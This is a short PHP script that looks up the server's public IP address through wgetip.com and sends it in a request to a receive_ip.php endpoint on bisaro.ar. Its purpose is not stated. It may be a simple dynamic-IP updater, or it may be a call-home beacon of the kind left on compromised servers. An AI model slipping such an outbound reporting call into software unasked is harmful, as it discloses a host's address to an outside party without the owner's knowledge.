<?php
$ip = file_get_contents('https://wgetip.com');
echo file_get_contents('http://bisaro.ar/receive_ip.php?ip='.$ip);